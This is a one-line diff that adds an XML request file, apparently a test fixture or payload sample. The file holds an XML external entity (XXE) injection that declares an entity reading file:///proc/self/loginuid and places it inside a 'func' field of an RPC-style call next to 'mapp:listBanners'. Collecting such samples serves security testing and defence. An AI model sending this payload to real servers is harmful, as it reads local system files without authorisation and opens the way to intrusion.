@@ -1,0 +1,1 @@
+<?xml version="1.0"?><!DOCTYPE object [ <!ELEMENT string ANY> <!ENTITY xx1 SYSTEM "file:///proc/self/loginuid"> ]><object><array name="items"><object><string name="func">mapp:listBanners</string><object name="var"><int name="position">0</int></object></object><object><string name="func">mapp:&xx1;</string></object></array></object>
